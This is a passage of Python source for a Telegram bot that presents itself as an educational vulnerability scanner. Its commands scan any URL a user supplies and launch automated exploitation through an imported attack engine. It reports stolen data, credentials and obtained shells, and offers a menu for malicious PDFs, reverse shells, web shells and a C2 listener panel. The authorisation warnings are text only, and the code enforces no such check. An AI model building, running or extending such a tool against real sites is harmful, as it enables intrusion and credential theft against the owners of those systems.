import os
import asyncio
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime
import datetime
import json
import io
from dotenv import load_dotenv
import os

# Load environment variables first
load_dotenv()

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
    from telegram.constants import ParseMode
    TELEGRAM_AVAILABLE = True
except ImportError as e:
    print(f"Telegram bot dependencies not available: {e}")
    # Define dummy classes to prevent NameError
    class Update: pass
    class ContextTypes:
        class DEFAULT_TYPE: pass
    class ParseMode:
        MARKDOWN = "Markdown"
    class InlineKeyboardButton: pass
    class InlineKeyboardMarkup: pass
    TELEGRAM_AVAILABLE = False

try:
    from comprehensive_scanner import ComprehensiveScanner
    from report_generator import ReportGenerator
    from auto_remediation import AutoRemediation
    from payload_generator import PayloadGenerator
    from osint_module import perform_osint_scan
except ImportError as e:
    print(f"Import error: {e}")
    ComprehensiveScanner = None
    PayloadGenerator = None
    ReportGenerator = None
    perform_osint_scan = None

try:
    from attack_engine import AttackEngine
except ImportError:
    AttackEngine = None
try:
    from vps_vds_attacks import VPSVDSAttacks
except ImportError:
    VPSVDSAttacks = None

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class VulnerabilityTelegramBot:
    def __init__(self):
        self.user_sessions = {}  # Store user scan sessions
        self.active_scans = {}   # Track active scans
        self.payload_generator = PayloadGenerator() if PayloadGenerator else None  # Initialize payload generator

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler"""
        user_id = update.effective_user.id

        welcome_text = """
🔍 **Educational Vulnerability Scanner Bot**

Welcome! This bot helps you understand web security vulnerabilities through educational scanning.

⚠️ **IMPORTANT**: Only scan websites you own or have explicit permission to test.

**Available Commands:**
/scan - Start a vulnerability scan
/osint - Perform OSINT reconnaissance
/payload - Generate malicious payloads
/config - Configure scan settings
/help - Show help information
/status - Check current scan status

**Features:**
✅ SQL Injection Detection
✅ XSS Vulnerability Scanning
✅ IDOR Testing
✅ Port Scanning
✅ SSL/TLS Analysis
✅ VPS/VDS Attack Testing
✅ Auto-Remediation
✅ Interactive Attack Engine
✅ Malicious PDF Generation
✅ Reverse Shell Payloads

Get started with /scan to begin scanning or /osint to gather intel!
        """

        await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = """
🤖 **Advanced Security Scanner Bot Commands:**

🔍 `/scan <url>` - Comprehensive vulnerability scan
⚔️ `/attack <url>` - Launch real-time exploitation attacks
🕵️ `/osint <url>` - OSINT reconnaissance & information gathering
💀 `/payload <type>` - Generate malicious payloads
📊 `/exploits` - Show detailed exploit results
🔑 `/credentials` - Show discovered credentials
📊 `/help` - Show this help message

**Example Usage:**
• `/scan https://example.com` - Discovery only
• `/attack https://target.com` - Full exploitation
• `/osint https://target.com` - Intelligence gathering
• `/payload pdf` - Generate attack payloads

**OSINT Features:**
• Subdomain enumeration
• Email address discovery
• Technology stack detection
• SSL certificate analysis
• Social media profile discovery
• Public file detection

⚠️ **Legal Warning:** Only use on systems you own or have permission to test!
"""
        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /scan command"""
        if not context.args:
            await update.message.reply_text(
                "❌ Please provide a URL to scan.\n"
                "Usage: `/scan https://example.com`",
                parse_mode='Markdown'
            )
            return

        target_url = context.args[0]

        # Validate URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url

        await update.message.reply_text(
            f"🔍 **Starting comprehensive scan for:** `{target_url}`\n"
            f"⏳ This may take a few minutes...",
            parse_mode='Markdown'
        )

        try:
            # Initialize scanner
            scanner = ComprehensiveScanner(target_url)

            # Send progress updates
            await update.message.reply_text("🔄 **Checking target accessibility...**", parse_mode='Markdown')
            if not scanner.check_target_accessibility():
                await update.message.reply_text("❌ **Target is not accessible**", parse_mode='Markdown')
                return

            await update.message.reply_text("🔄 **Scanning for vulnerabilities...**", parse_mode='Markdown')
            scanner.scan_web_vulnerabilities(aggressive=True)

            await update.message.reply_text("🔄 **Checking security headers...**", parse_mode='Markdown')
            scanner.check_security_headers()

            await update.message.reply_text("🔄 **Scanning ports and services...**", parse_mode='Markdown')
            scanner.scan_ports()

            await update.message.reply_text("🔄 **Analyzing SSL/TLS...**", parse_mode='Markdown')
            scanner.scan_ssl_tls()

            await update.message.reply_text("🔄 **Detecting technologies...**", parse_mode='Markdown')
            scanner.detect_cms_and_technologies()

            await update.message.reply_text("🔄 **Performing OSINT reconnaissance...**", parse_mode='Markdown')
            scanner.perform_osint_reconnaissance()

            # Get results
            results = scanner.get_results()

            # Send summary
            summary = self.generate_scan_summary(results)
            await update.message.reply_text(summary, parse_mode='Markdown')

            # Send detailed reports
            await self.send_reports(update, context, results)

        except Exception as e:
            await update.message.reply_text(
                f"❌ **Scan failed:** `{str(e)}`",
                parse_mode='Markdown'
            )

    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /attack command for direct exploitation"""
        if not context.args:
            await update.message.reply_text(
                "❌ Please provide a URL to attack.\n"
                "Usage: `/attack https://example.com`",
                parse_mode='Markdown'
            )
            return

        target_url = context.args[0]

        # Validate URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url

        await update.message.reply_text(
            f"⚔️ **Starting automated attack sequence for:** `{target_url}`\n"
            f"⏳ Scanning for vulnerabilities first...",
            parse_mode='Markdown'
        )

        try:
            # First, scan for vulnerabilities
            scanner = ComprehensiveScanner(target_url)

            await update.message.reply_text("🔄 **Phase 1: Vulnerability Discovery**", parse_mode='Markdown')

            # Quick vulnerability scan
            if not scanner.check_target_accessibility():
                await update.message.reply_text("❌ **Target is not accessible for attacks**", parse_mode='Markdown')
                return

            scanner.scan_web_vulnerabilities(aggressive=True)
            results = scanner.get_results()

            if not results['vulnerabilities']:
                await update.message.reply_text(
                    "ℹ️ **No vulnerabilities found** - Target appears secure or not vulnerable to basic attacks.",
                    parse_mode='Markdown'
                )
                return

            # Start attack phase
            await update.message.reply_text(
                f"⚔️ **Phase 2: Active Exploitation**\n"
                f"Found {len(results['vulnerabilities'])} vulnerabilities to exploit...",
                parse_mode='Markdown'
            )

            # Initialize attack engine
            if AttackEngine:
                attack_engine = AttackEngine(results['target_url'], results['vulnerabilities'])
                attack_results = attack_engine.start_interactive_attacks()

                # Generate attack summary
                attack_summary = f"""
⚔️ **Live Attack Results**

🎯 **Target:** `{target_url}`
📊 **Attacks Executed:** {attack_results.get('total_attacks', 0)}
✅ **Successful Exploits:** {attack_results.get('successful_exploits', 0)}
❌ **Failed Attempts:** {attack_results.get('failed_exploits', 0)}
📈 **Success Rate:** {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%

**💀 Exploitation Results:**
"""

                # Add data extraction results
                if attack_results.get('extracted_data'):
                    attack_summary += f"📊 **Data Extracted:** {len(attack_results['extracted_data'])} items\n"
                    for i, data in enumerate(attack_results['extracted_data'][:3], 1):
                        attack_summary += f"  {i}. `{data[:50]}{'...' if len(data) > 50 else ''}`\n"

                # Add credentials found
                if attack_results.get('credentials_found'):
                    attack_summary += f"\n🔑 **Credentials Discovered:** {len(attack_results['credentials_found'])}\n"
                    for cred in attack_results['credentials_found'][:2]:
                        attack_summary += f"  • `{cred.get('data', 'N/A')[:40]}...`\n"

                # Add shells obtained
                if attack_results.get('shells_obtained'):
                    attack_summary += f"\n🐚 **Shells Obtained:** {len(attack_results['shells_obtained'])}\n"
                    for shell in attack_results['shells_obtained']:
                        attack_summary += f"  • **{shell['type']}**: {shell.get('status', 'Active')}\n"

                await update.message.reply_text(attack_summary, parse_mode='Markdown')

                # Show attack console log
                if attack_results.get('console_output'):
                    console_log = "\n".join(attack_results['console_output'][-10:])  # Last 10 entries
                    await update.message.reply_text(
                        f"📋 **Attack Console Log:**\n```\n{console_log}\n```",
                        parse_mode='Markdown'
                    )

                # Store results for detailed commands
                user_id = update.effective_user.id
                if not hasattr(self, 'last_attack_results'):
                    self.last_attack_results = {}
                self.last_attack_results[user_id] = attack_results

                # Save all attack data to files and send them
                await self._save_and_send_attack_data(update, attack_results, target_url)

                await update.message.reply_text(
                    "✅ **Attack sequence completed!**\n\n"
                    "📁 **All data files have been sent above**\n"
                    "Use `/exploits` to see detailed exploit results\n"
                    "Use `/credentials` to see discovered credentials",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Attack engine not available", parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(
                f"❌ **Attack failed:** `{str(e)}`",
                parse_mode='Markdown'
            )

    async def osint_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /osint command"""
        if not context.args:
            await update.message.reply_text(
                "❌ Please provide a URL for OSINT gathering.\n"
                "Usage: `/osint https://example.com`",
                parse_mode='Markdown'
            )
            return

        target_url = context.args[0]

        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url

        await update.message.reply_text(
            f"🕵️ **Starting OSINT reconnaissance for:** `{target_url}`\n"
            f"⏳ Gathering public information...",
            parse_mode='Markdown'
        )

        try:
            if perform_osint_scan:
                osint_results = perform_osint_scan(target_url)

                # Format OSINT summary
                osint_summary = f"""
🕵️ **OSINT Reconnaissance Results**

**🌐 Domain Information:**
• Registrar: {osint_results.get('whois_info', {}).get('registrar', 'Unknown')}
• Country: {osint_results.get('whois_info', {}).get('country', 'Unknown')}

**🔍 Subdomains Found:** {len(osint_results.get('subdomains', []))}
{chr(10).join([f"• {sub}" for sub in osint_results.get('subdomains', [])[:5]])}
{'• ...' if len(osint_results.get('subdomains', [])) > 5 else ''}

**📧 Email Addresses:** {len(osint_results.get('emails', []))}
{chr(10).join([f"• {email}" for email in osint_results.get('emails', [])[:3]])}
{'• ...' if len(osint_results.get('emails', [])) > 3 else ''}

**💻 Technologies Detected:**
{chr(10).join([f"• {tech}" for tech in osint_results.get('technologies', [])])}

**📱 Social Media:**
{chr(10).join([f"• {social}" for social in osint_results.get('social_media', [])])}

**📁 Public Files:**
{chr(10).join([f"• {file}" for file in osint_results.get('public_files', [])])}
"""

                await update.message.reply_text(osint_summary, parse_mode='Markdown')

                # Send OSINT report as file
                osint_report = json.dumps(osint_results, indent=2, ensure_ascii=False)
                osint_file = io.BytesIO(osint_report.encode('utf-8'))
                osint_file.name = f"osint_report_{int(datetime.now().timestamp())}.json"

                await update.message.reply_document(
                    document=osint_file,
                    caption="📄 **Complete OSINT Report**"
                )
            else:
                await update.message.reply_text("❌ OSINT module not available", parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(
                f"❌ **OSINT gathering failed:** `{str(e)}`",
                parse_mode='Markdown'
            )

    async def config_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Configuration command handler"""
        user_id = update.effective_user.id

        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {
                'step': 'config',
                'config': {
                    'aggressive': False,
                    'include_ports': True,
                    'include_ssl': True,
                    'include_dns': True,
                    'max_pages': 3,
                    'auto_fix': False,
                    'attack_mode': False,
                    'vps_attack': False
                }
            }

        config = self.user_sessions[user_id]['config']

        keyboard = [
            [
                InlineKeyboardButton(f"Aggressive Scan: {'✅' if config['aggressive'] else '❌'}", callback_data="toggle_aggressive"),
                InlineKeyboardButton(f"Port Scanning: {'✅' if config['include_ports'] else '❌'}", callback_data="toggle_ports")
            ],
            [
                InlineKeyboardButton(f"SSL/TLS Check: {'✅' if config['include_ssl'] else '❌'}", callback_data="toggle_ssl"),
                InlineKeyboardButton(f"DNS Analysis: {'✅' if config['include_dns'] else '❌'}", callback_data="toggle_dns")
            ],
            [
                InlineKeyboardButton(f"Auto-Fix: {'✅' if config['auto_fix'] else '❌'}", callback_data="toggle_autofix"),
                InlineKeyboardButton(f"Attack Mode: {'✅' if config['attack_mode'] else '❌'}", callback_data="toggle_attack")
            ],
            [
                InlineKeyboardButton(f"VPS/VDS Attack: {'✅' if config['vps_attack'] else '❌'}", callback_data="toggle_vps"),
                InlineKeyboardButton(f"Max Pages: {config['max_pages']}", callback_data="set_pages")
            ],
            [
                InlineKeyboardButton("✅ Save Configuration", callback_data="save_config")
            ]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        config_text = f"""
⚙️ **Scan Configuration**

Current Settings:
• Aggressive Scanning: {'Enabled' if config['aggressive'] else 'Disabled'}
• Port Scanning: {'Enabled' if config['include_ports'] else 'Disabled'}
• SSL/TLS Analysis: {'Enabled' if config['include_ssl'] else 'Disabled'}
• DNS Vulnerability Check: {'Enabled' if config['include_dns'] else 'Disabled'}
• Auto-Remediation: {'Enabled' if config['auto_fix'] else 'Disabled'}
• Interactive Attack Mode: {'Enabled' if config['attack_mode'] else 'Disabled'}
• VPS/VDS Attacks: {'Enabled' if config['vps_attack'] else 'Disabled'}
• Maximum Pages to Scan: {config['max_pages']}

Tap buttons below to toggle settings:
        """

        await update.message.reply_text(config_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data

        await query.answer()

        if user_id not in self.user_sessions:
            await query.edit_message_text("❌ Session expired. Please start again with /config")
            return

        config = self.user_sessions[user_id]['config']

        if data == "toggle_aggressive":
            config['aggressive'] = not config['aggressive']
        elif data == "toggle_ports":
            config['include_ports'] = not config['include_ports']
        elif data == "toggle_ssl":
            config['include_ssl'] = not config['include_ssl']
        elif data == "toggle_dns":
            config['include_dns'] = not config['include_dns']
        elif data == "toggle_autofix":
            config['auto_fix'] = not config['auto_fix']
        elif data == "toggle_attack":
            config['attack_mode'] = not config['attack_mode']
        elif data == "toggle_vps":
            config['vps_attack'] = not config['vps_attack']
        elif data == "set_pages":
            # Cycle through page options
            config['max_pages'] = 1 if config['max_pages'] >= 10 else config['max_pages'] + 1
        elif data == "save_config":
            await query.edit_message_text("✅ Configuration saved! Use /scan to start scanning.")
            return
        elif data.startswith("payload_"):
            await self._handle_payload_selection(query, data)
            return

        # Update the configuration display
        keyboard = [
            [
                InlineKeyboardButton(f"Aggressive Scan: {'✅' if config['aggressive'] else '❌'}", callback_data="toggle_aggressive"),
                InlineKeyboardButton(f"Port Scanning: {'✅' if config['include_ports'] else '❌'}", callback_data="toggle_ports")
            ],
            [
                InlineKeyboardButton(f"SSL/TLS Check: {'✅' if config['include_ssl'] else '❌'}", callback_data="toggle_ssl"),
                InlineKeyboardButton(f"DNS Analysis: {'✅' if config['include_dns'] else '❌'}", callback_data="toggle_dns")
            ],
            [
                InlineKeyboardButton(f"Auto-Fix: {'✅' if config['auto_fix'] else '❌'}", callback_data="toggle_autofix"),
                InlineKeyboardButton(f"Attack Mode: {'✅' if config['attack_mode'] else '❌'}", callback_data="toggle_attack")
            ],
            [
                InlineKeyboardButton(f"VPS/VDS Attack: {'✅' if config['vps_attack'] else '❌'}", callback_data="toggle_vps"),
                InlineKeyboardButton(f"Max Pages: {config['max_pages']}", callback_data="set_pages")
            ],
            [
                InlineKeyboardButton("✅ Save Configuration", callback_data="save_config")
            ]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        config_text = f"""
⚙️ **Scan Configuration**

Current Settings:
• Aggressive Scanning: {'Enabled' if config['aggressive'] else 'Disabled'}
• Port Scanning: {'Enabled' if config['include_ports'] else 'Disabled'}
• SSL/TLS Analysis: {'Enabled' if config['include_ssl'] else 'Disabled'}
• DNS Vulnerability Check: {'Enabled' if config['include_dns'] else 'Disabled'}
• Auto-Remediation: {'Enabled' if config['auto_fix'] else 'Disabled'}
• Interactive Attack Mode: {'Enabled' if config['attack_mode'] else 'Disabled'}
• VPS/VDS Attacks: {'Enabled' if config['vps_attack'] else 'Disabled'}
• Maximum Pages to Scan: {config['max_pages']}

Tap buttons below to toggle settings:
        """

        await query.edit_message_text(config_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        message_text = update.message.text

        if user_id not in self.user_sessions:
            await update.message.reply_text(
                "Please start with /scan command to begin a vulnerability scan."
            )
            return

        session = self.user_sessions[user_id]

        if session['step'] == 'target':
            # Validate URL
            target_url = message_text.strip()

            if not target_url.startswith(('http://', 'https://')):
                await update.message.reply_text(
                    "❌ Please provide a valid URL starting with http:// or https://"
                )
                return

            # Start the scan
            session['target_url'] = target_url
            self.active_scans[user_id] = True

            await self.start_vulnerability_scan(update, context, target_url, session['config'])

    async def start_vulnerability_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE, target_url: str, config: Dict):
        """Start the vulnerability scanning process"""
        user_id = update.effective_user.id

        # Initialize scan results storage
        if not hasattr(self, 'last_scan_results'):
            self.last_scan_results = {}

        progress_message = await update.message.reply_text(
            f"🔍 **Starting Vulnerability Scan**\n\n"
            f"Target: `{target_url}`\n"
            f"Status: Initializing scanner...\n"
            f"Progress: ░░░░░░░░░░ 0%",
            parse_mode=ParseMode.MARKDOWN
        )

        try:
            # Initialize scanner
            scanner = ComprehensiveScanner(target_url)

            # Progress tracking
            progress_steps = [
                ("Checking target accessibility...", 10),
                ("Scanning ports and services...", 20),
                ("Analyzing web vulnerabilities...", 40),
                ("Testing SQL injection...", 50),
                ("Testing XSS vulnerabilities...", 60),
                ("Testing IDOR vulnerabilities...", 70),
                ("Checking SSL/TLS security...", 80),
                ("Analyzing DNS configuration...", 90),
                ("Generating report...", 95),
                ("Scan completed!", 100)
            ]

            for step_name, progress in progress_steps:
                if user_id not in self.active_scans:
                    await progress_message.edit_text("❌ **Scan Cancelled**")
                    return

                # Update progress
                progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
                await progress_message.edit_text(
                    f"🔍 **Vulnerability Scan In Progress**\n\n"
                    f"Target: `{target_url}`\n"
                    f"Status: {step_name}\n"
                    f"Progress: {progress_bar} {progress}%",
                    parse_mode=ParseMode.MARKDOWN
                )

                # Execute scan steps
                if progress == 10:
                    if not scanner.check_target_accessibility():
                        await progress_message.edit_text(
                            f"❌ **Scan Failed**\n\n"
                            f"Target `{target_url}` is not accessible.\n"
                            f"Please check the URL and try again."
                        )
                        del self.active_scans[user_id]
                        return

                elif progress == 20 and config['include_ports']:
                    scanner.scan_ports()

                elif progress == 40:
                    scanner.scan_web_vulnerabilities(aggressive=config['aggressive'])
                    scanner.detect_cms_and_technologies()

                elif progress == 80 and config['include_ssl']:
                    scanner.scan_ssl_tls()

                elif progress == 90 and config['include_dns']:
                    scanner.scan_dns_vulnerabilities()

                await asyncio.sleep(0.5)  # Small delay for UI updates

            # Get scan results
            results = scanner.get_results()

            # Store results for attack details
            self.last_scan_results[user_id] = results

            # Generate summary
            summary = self.generate_scan_summary(results)

            await progress_message.edit_text(summary, parse_mode=ParseMode.MARKDOWN)

            # Auto-remediation if enabled
            if config['auto_fix'] and results['vulnerabilities']:
                await self.run_auto_remediation(update, context, results, config)

            # Interactive attacks if enabled
            if config['attack_mode'] and results['vulnerabilities'] and AttackEngine:
                await self.run_interactive_attacks(update, context, results, config)

            # VPS/VDS attacks if enabled
            if config['vps_attack'] and hasattr(scanner, 'run_vps_vds_attacks'):
                await self.run_vps_attacks(update, context, scanner, config)

            # Generate and send reports
            await self.send_reports(update, context, results)

        except Exception as e:
            await progress_message.edit_text(
                f"❌ **Scan Error**\n\n"
                f"An error occurred during scanning:\n"
                f"`{str(e)}`\n\n"
                f"Please try again with a different target.",
                parse_mode=ParseMode.MARKDOWN
            )
        finally:
            if user_id in self.active_scans:
                del self.active_scans[user_id]
            if user_id in self.user_sessions:
                del self.user_sessions[user_id]

    async def run_auto_remediation(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results: Dict, config: Dict):
        """Run auto-remediation on found vulnerabilities"""
        remediation_message = await update.message.reply_text(
            "🔧 **Starting Auto-Remediation**\n\nAnalyzing vulnerabilities for automatic fixes..."
        )

        try:
            auto_remediation = AutoRemediation(results['target_url'], results['vulnerabilities'])
            severity_filter = ['Critical', 'High', 'Medium']
            fix_results = auto_remediation.auto_fix_by_severity(severity_filter)

            fix_summary = f"""
🔧 **Auto-Remediation Results**

✅ **Attempted:** {fix_results['total_attempted']}
✅ **Successful:** {fix_results['successful_fixes']}
❌ **Failed:** {fix_results['failed_fixes']}
📊 **Success Rate:** {(fix_results['successful_fixes'] / max(fix_results['total_attempted'], 1)) * 100:.1f}%

**Top Fixes Applied:**
"""

            for i, fix in enumerate(fix_results['fix_details'][:3], 1):
                status_icon = "✅" if fix['success'] else "❌"
                fix_summary += f"{i}. {status_icon} {fix['vulnerability_type']}\n"

            await remediation_message.edit_text(fix_summary)

        except Exception as e:
            await remediation_message.edit_text(f"❌ Auto-remediation failed: {str(e)}")

    async def run_interactive_attacks(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results: Dict, config: Dict):
        """Run interactive attacks on vulnerabilities"""
        attack_message = await update.message.reply_text(
            "⚔️ **Starting Interactive Attacks**\n\nExecuting vulnerability exploits..."
        )

        try:
            if AttackEngine:
                attack_engine = AttackEngine(results['target_url'], results['vulnerabilities'])
                attack_results = attack_engine.start_interactive_attacks()

                # Store attack results for detailed view
                self.attack_engine_results = attack_results

                attack_summary = f"""
⚔️ **Attack Execution Results**

🎯 **Total Attacks:** {attack_results.get('total_attacks', 0)}
✅ **Successful:** {attack_results.get('successful_exploits', 0)}
❌ **Failed:** {attack_results.get('failed_exploits', 0)}
📊 **Success Rate:** {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%

**Data Extracted:** {len(attack_results.get('extracted_data', []))}
**Credentials Found:** {len(attack_results.get('credentials_found', []))}
**Shells Obtained:** {len(attack_results.get('shells_obtained', []))}
"""

                if attack_results.get('credentials_found'):
                    attack_summary += "\n🔑 **Credentials Discovered:**\n"
                    for cred in attack_results['credentials_found'][:3]:
                        attack_summary += f"• {cred.get('data', 'N/A')}\n"

                await attack_message.edit_text(attack_summary)
            else:
                await attack_message.edit_text("❌ Interactive attack engine not available")

        except Exception as e:
            await attack_message.edit_text(f"❌ Interactive attacks failed: {str(e)}")

    async def run_vps_attacks(self, update: Update, context: ContextTypes.DEFAULT_TYPE, scanner: ComprehensiveScanner, config: Dict):
        """Run VPS/VDS attacks"""
        vps_message = await update.message.reply_text(
            "🚀 **Starting VPS/VDS Attacks**\n\nExecuting server-level attacks..."
        )

        try:
            vps_results = scanner.run_vps_vds_attacks()

            if vps_results:
                # Store VPS results for detailed view
                self.vps_exploit_results = vps_results

                vps_summary = f"""
🚀 **VPS/VDS Attack Results**

🎯 **Total Attacks:** {vps_results.get('total_attacks', 0)}
✅ **Successful:** {vps_results.get('successful_attacks', 0)}
🔑 **Credentials Found:** {len(vps_results.get('credentials_found', []))}
🐚 **Shells Obtained:** {len(vps_results.get('shells_obtained', []))}
"""

                if vps_results.get('credentials_found'):
                    vps_summary += "\n🔑 **Credentials Discovered:**\n"
                    for cred in vps_results['credentials_found'][:3]:
                        vps_summary += f"• {cred.get('service', 'Unknown')}: {cred.get('username', '')}:{cred.get('password', '')}\n"

                await vps_message.edit_text(vps_summary)
            else:
                await vps_message.edit_text("ℹ️ No VPS/VDS vulnerabilities found or applicable.")

        except Exception as e:
            await vps_message.edit_text(f"❌ VPS/VDS attacks failed: {str(e)}")

    def generate_scan_summary(self, results: Dict) -> str:
        """Generate a summary of scan results"""
        total_vulns = len(results['vulnerabilities'])
        critical_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])
        high_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'High'])
        medium_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])
        low_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'Low'])

        summary = f"""
✅ **Vulnerability Scan Complete**

🎯 **Target:** `{results['target_url']}`
📊 **Total Issues Found:** {total_vulns}

**Severity Breakdown:**
🔴 Critical: {critical_count}
🟠 High: {high_count}
🟡 Medium: {medium_count}
🟢 Low: {low_count}

**Infrastructure:**
"""

        if results.get('target_ip'):
            summary += f"📍 **IP:** `{results['target_ip']}`\n"

        if results.get('open_ports'):
            summary += f"🔌 **Open Ports:** {', '.join(map(str, results['open_ports']))}\n"

        if results.get('services'):
            summary += "🛠️ **Services:**\n"
            for port, service in list(results['services'].items())[:3]:
                summary += f"  • Port {port}: {service}\n"

        if total_vulns > 0:
            summary += "\n**Top Vulnerabilities:**\n"
            for i, vuln in enumerate(results['vulnerabilities'][:5], 1):
                severity_emoji = {'Critical': '🔴', 'High': '🟠', 'Medium': '🟡', 'Low': '🟢'}.get(vuln['severity'], '⚪')
                summary += f"{i}. {severity_emoji} {vuln['type']}\n"
        else:
            summary += "\n🎉 **No vulnerabilities detected!**"

        return summary

    async def send_reports(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results: Dict):
        """Send detailed reports to user"""
        try:
            report_gen = ReportGenerator(results)

            # Generate JSON report
            json_report = report_gen.generate_json_report()
            json_file = io.BytesIO(json_report.encode('utf-8'))
            json_file.name = f"vulnerability_report_{int(datetime.now().timestamp())}.json"

            # Generate HTML report
            html_report = report_gen.generate_html_report()
            html_file = io.BytesIO(html_report.encode('utf-8'))
            html_file.name = f"vulnerability_report_{int(datetime.now().timestamp())}.html"

            # Send files
            await update.message.reply_document(
                document=json_file,
                caption="📄 **JSON Report** - Machine-readable vulnerability data"
            )

            await update.message.reply_document(
                document=html_file,
                caption="📄 **HTML Report** - Human-friendly vulnerability report"
            )

        except Exception as e:
            await update.message.reply_text(f"❌ Failed to generate reports: {str(e)}")

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check scan status"""
        user_id = update.effective_user.id

        if user_id in self.active_scans:
            await update.message.reply_text("🔍 You have an active scan running. Please wait for completion.")
        else:
            await update.message.reply_text("ℹ️ No active scans. Use /scan to start a new scan.")

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Stop current scan"""
        user_id = update.effective_user.id

        if user_id in self.active_scans:
            del self.active_scans[user_id]
            if user_id in self.user_sessions:
                del self.user_sessions[user_id]
            await update.message.reply_text("🛑 Scan stopped successfully.")
        else:
            await update.message.reply_text("ℹ️ No active scan to stop.")

    async def attacks_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show detailed attack information from last scan"""
        user_id = update.effective_user.id

        # Check if user has recent scan data
        if not hasattr(self, 'last_scan_results') or user_id not in getattr(self, 'last_scan_results', {}):
            await update.message.reply_text(
                "ℹ️ No recent scan data available. Please run /scan first."
            )
            return

        results = self.last_scan_results[user_id]

        # Generate attack details
        attack_details = self._generate_attack_details(results)

        if attack_details:
            await update.message.reply_text(attack_details, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ No attack data available from the last scan.")

    async def exploits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show successful exploits and extracted data"""
        user_id = update.effective_user.id

        if not hasattr(self, 'last_scan_results') or user_id not in getattr(self, 'last_scan_results', {}):
            await update.message.reply_text(
                "ℹ️ No recent scan data available. Please run /scan first."
            )
            return

        results = self.last_scan_results[user_id]

        # Generate exploit details
        exploit_details = self._generate_exploit_details(results)

        if exploit_details:
            await update.message.reply_text(exploit_details, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("✅ No successful exploits found - target appears secure!")

    async def credentials_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show discovered credentials"""
        user_id = update.effective_user.id

        if not hasattr(self, 'last_scan_results') or user_id not in getattr(self, 'last_scan_results', {}):
            await update.message.reply_text(
                "ℹ️ No recent scan data available. Please run /scan first."
            )
            return

        results = self.last_scan_results[user_id]

        # Generate credentials report
        creds_details = self._generate_credentials_report(results)

        if creds_details:
            await update.message.reply_text(creds_details, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ No credentials discovered during scan.")

    async def payload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Payload generation command handler"""
        user_id = update.effective_user.id

        # Initialize payload session
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {}

        self.user_sessions[user_id]['step'] = 'payload_type'

        keyboard = [
            [
                InlineKeyboardButton("🎯 Malicious PDF", callback_data="payload_pdf"),
                InlineKeyboardButton("💻 PowerShell", callback_data="payload_powershell")
            ],
            [
                InlineKeyboardButton("🐧 Bash/Linux", callback_data="payload_bash"),
                InlineKeyboardButton("🐍 Python", callback_data="payload_python")
            ],
            [
                InlineKeyboardButton("🌐 Web Shells", callback_data="payload_webshell"),
                InlineKeyboardButton("🎛️ Listener Panel", callback_data="payload_listener")
            ]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        payload_text = """
💀 **Payload Generator**

⚠️ **WARNING**: For authorized penetration testing only!

Select the type of payload you want to generate:

🎯 **Malicious PDF** - Cross-platform exploitation
💻 **PowerShell** - Windows reverse shells
🐧 **Bash/Linux** - Unix/Linux reverse shells
🐍 **Python** - Cross-platform Python shells
🌐 **Web Shells** - PHP/ASP backdoors
🎛️ **Listener Panel** - Web-based C2 panel

Choose your payload type below:
        """

        await update.message.reply_text(payload_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

    def _generate_attack_details(self, results: Dict) -> str:
        """Generate detailed attack information"""
        if not hasattr(self, 'attack_results'):
            return ""

        attack_info = f"""
